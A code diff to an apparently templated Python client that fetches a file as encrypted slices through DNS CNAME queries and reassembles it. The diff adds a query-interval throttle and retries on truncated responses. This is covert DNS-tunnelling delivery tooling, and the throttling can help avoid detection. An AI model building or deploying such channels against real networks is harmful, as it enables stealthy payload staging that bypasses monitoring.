@@ -44,6 +44,7 @@ MAX_ROUNDS = @@MAX_ROUNDS@@
 MAX_CONSECUTIVE_TIMEOUTS = @@MAX_CONSECUTIVE_TIMEOUTS@@
 RETRY_SLEEP_BASE_MS = @@RETRY_SLEEP_BASE_MS@@
 RETRY_SLEEP_JITTER_MS = @@RETRY_SLEEP_JITTER_MS@@
+QUERY_INTERVAL_MS = @@QUERY_INTERVAL_MS@@
 
 DNS_FLAG_QR = 0x8000
 DNS_FLAG_TC = 0x0200
@@ -288,7 +289,7 @@ def _parse_response_for_cname(message, expected_id, expected_qname_labels):
     if (flags & DNS_FLAG_QR) == 0:
         raise ClientError(EXIT_PARSE, "parse", "response missing QR flag")
     if flags & DNS_FLAG_TC:
-        raise ClientError(EXIT_PARSE, "parse", "response sets TC")
+        raise RetryableTransport("response truncated (TC)")
     if (flags & DNS_OPCODE_MASK) != DNS_OPCODE_QUERY:
         raise ClientError(EXIT_PARSE, "parse", "response opcode is not QUERY")
 
@@ -567,6 +568,16 @@ def _parse_positive_int(raw_value, flag_name):
     return value
 
 
+def _parse_non_negative_int(raw_value, flag_name):
+    try:
+        value = int(raw_value)
+    except (TypeError, ValueError):
+        raise ClientError(EXIT_USAGE, "usage", "%s must be an integer" % flag_name)
+    if value < 0:
+        raise ClientError(EXIT_USAGE, "usage", "%s must be >= 0" % flag_name)
+    return value
+
+
 def _resolve_udp_address(host, port):
     infos = socket.getaddrinfo(host, int(port), socket.AF_INET, socket.SOCK_DGRAM)
     if not infos:
@@ -814,11 +825,13 @@ def _validate_embedded_constants():
     return tuple(domain_labels)
 
 
-def _download_slices(psk_value, resolver_addr, request_timeout, no_progress_timeout, max_rounds, domain_labels_by_domain):
+def _download_slices(psk_value, resolver_addr, request_timeout, no_progress_timeout, max_rounds, query_interval_ms, domain_labels_by_domain):
     missing = set(range(TOTAL_SLICES))
     stored = {}
     enc_key_bytes = _enc_key(psk_value)
     mac_key_bytes = _mac_key(psk_value)
+
+    query_interval_sec = float(query_interval_ms) / 1000.0
 
     last_progress_time = time.time()
     domain_index = 0
@@ -843,6 +856,7 @@ def _download_slices(psk_value, resolver_addr, request_timeout, no_progress_time
 
             try:
                 response = _send_dns_query(resolver_addr, query_packet, request_timeout)
+                cname_labels = _parse_response_for_cname(response, query_id, qname_labels)
             except RetryableTransport:
                 consecutive_timeouts += 1
                 if consecutive_timeouts > MAX_CONSECUTIVE_TIMEOUTS:
@@ -856,7 +870,6 @@ def _download_slices(psk_value, resolver_addr, request_timeout, no_progress_time
                 continue
 
             consecutive_timeouts = 0
-            cname_labels = _parse_response_for_cname(response, query_id, qname_labels)
             payload_text = _extract_payload_text(cname_labels, domain_labels)
             ciphertext, mac = _parse_slice_record(payload_text)
             slice_plain = _decrypt_and_verify_slice(
@@ -882,6 +895,9 @@ def _download_slices(psk_value, resolver_addr, request_timeout, no_progress_time
             elif current_value != slice_plain:
                 raise ClientError(EXIT_CRYPTO, "crypto", "duplicate slice mismatch")
 
+            if query_interval_sec > 0:
+                time.sleep(query_interval_sec)
+
         if not progress_this_round and (time.time() - last_progress_time) >= no_progress_timeout:
             raise ClientError(EXIT_TRANSPORT, "dns", "no-progress timeout")
 
@@ -899,6 +915,7 @@ def _build_parser():
         default=str(NO_PROGRESS_TIMEOUT_SECONDS),
     )
     parser.add_argument("--max-rounds", default=str(MAX_ROUNDS))
+    parser.add_argument("--query-interval", default=str(QUERY_INTERVAL_MS))
     parser.add_argument("--verbose", action="store_true", default=False)
     return parser
 
@@ -919,6 +936,7 @@ def _parse_runtime_args(argv):
         "--no-progress-timeout",
     )
     max_rounds = _parse_positive_int(args.max_rounds, "--max-rounds")
+    query_interval_ms = _parse_non_negative_int(args.query_interval, "--query-interval")
 
     resolver_arg = (args.resolver or "").strip()
     if resolver_arg:
@@ -930,7 +948,7 @@ def _parse_runtime_args(argv):
     if not out_path:
         out_path = _deterministic_output_path()
 
-    return psk_value, resolver_addr, out_path, timeout_seconds, no_progress_timeout, max_rounds
+    return psk_value, resolver_addr, out_path, timeout_seconds, no_progress_timeout, max_rounds, query_interval_ms
 
 
 def main(argv=None):
@@ -946,6 +964,7 @@ def main(argv=None):
             timeout_seconds,
             no_progress_timeout,
             max_rounds,
+            query_interval_ms,
         ) = _parse_runtime_args(argv)
         _log(
             "start file_id=%s target_os=%s resolver=%s:%d slices=%d" % (
@@ -963,6 +982,7 @@ def main(argv=None):
             timeout_seconds,
             no_progress_timeout,
             max_rounds,
+            query_interval_ms,
             domain_labels_by_domain,
         )
         plaintext = _reassemble_plaintext(slices)
